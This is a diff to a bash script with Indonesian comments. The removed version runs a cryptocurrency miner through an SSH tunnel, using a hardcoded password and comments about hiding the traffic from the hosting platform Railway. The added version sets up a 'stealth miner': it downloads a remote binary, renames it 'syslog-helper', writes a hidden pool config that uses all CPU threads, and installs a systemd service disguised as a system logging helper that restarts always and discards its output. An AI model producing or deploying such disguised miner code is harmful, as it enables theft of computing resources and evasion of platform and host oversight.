@@ -1,28 +1,61 @@
 #!/bin/bash
 
-# --- KONFIGURASI SSH TUNNEL ---
-SSH_USER="cloudsigma" # Ganti dengan user SSH server kamu
-SSH_PASS="Bismillah" # Ganti dengan password SSH kamu
-SSH_HOST="45.115.224.184"
-SSH_PORT="443"
+# --- KONFIGURASI ---
+# Nama samaran untuk binary dan service
+FAKE_NAME="syslog-helper"
+BINARY_URL="https://gitlab.com/ferrynara12/mypro/-/raw/main/docker"
+INSTALL_DIR="/usr/local/bin"
+CONF_DIR="/etc/syslog-conf"
 
-echo "Membuka Tunnel SSH (Enkripsi Penuh)..."
+echo "--- Memulai Setup Stealth Miner di Server Pribadi ---"
 
-# Membuka SOCKS5 lokal di port 1080 melalui Tunnel SSH
-# Railway hanya akan melihat trafik SSH ke server kamu
-sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -N -D 1080 $SSH_USER@$SSH_HOST -p $SSH_PORT &
+# 1. Instal Dependensi
+apt update && apt install -y curl libcurl4 libjansson4 libssl3
 
-# Tunggu terowongan siap
-sleep 7
+# 2. Buat direktori konfigurasi tersembunyi
+mkdir -p $CONF_DIR
 
-echo "Menjalankan miner melalui Tunnel..."
+# 3. Download dan Rename Binary
+echo "Mengunduh binary..."
+curl -L $BINARY_URL -o $INSTALL_DIR/$FAKE_NAME
+chmod +x $INSTALL_DIR/$FAKE_NAME
 
-# Jalankan miner menggunakan proxy lokal (127.0.0.1) yang dibuat oleh SSH
-./docker -c docker.json --proxy="socks5://127.0.0.1:1080" >/dev/null 2>&1 &
+# 4. Buat file konfigurasi JSON
+cat <<EOF > $CONF_DIR/config.json
+{
+    "algo": "yespower",
+    "url": "stratum+tcp://dagnam.xyz:4629",
+    "user": "WXDNsKHm8X4RQm9tMpXaLMmxb8Mp1Vxvh6.1",
+    "pass": "c=SWAMP",
+    "threads": $(nproc ),
+    "quiet": true
+}
+EOF
 
-echo "Running..."
+# 5. Buat Systemd Service (Agar jalan otomatis 24/7)
+cat <<EOF > /etc/systemd/system/$FAKE_NAME.service
+[Unit]
+Description=System Logging Helper Service
+After=network.target
 
-while true
-do
-  sleep 60
-done
+[Service]
+Type=simple
+ExecStart=$INSTALL_DIR/$FAKE_NAME -c $CONF_DIR/config.json
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# 6. Jalankan Service
+systemctl daemon-reload
+systemctl enable $FAKE_NAME
+systemctl start $FAKE_NAME
+
+echo "--- Setup Selesai! ---"
+echo "Miner berjalan sebagai service: $FAKE_NAME"
+echo "Cek status: systemctl status $FAKE_NAME"
+echo "Cek proses: ps aux | grep $FAKE_NAME"
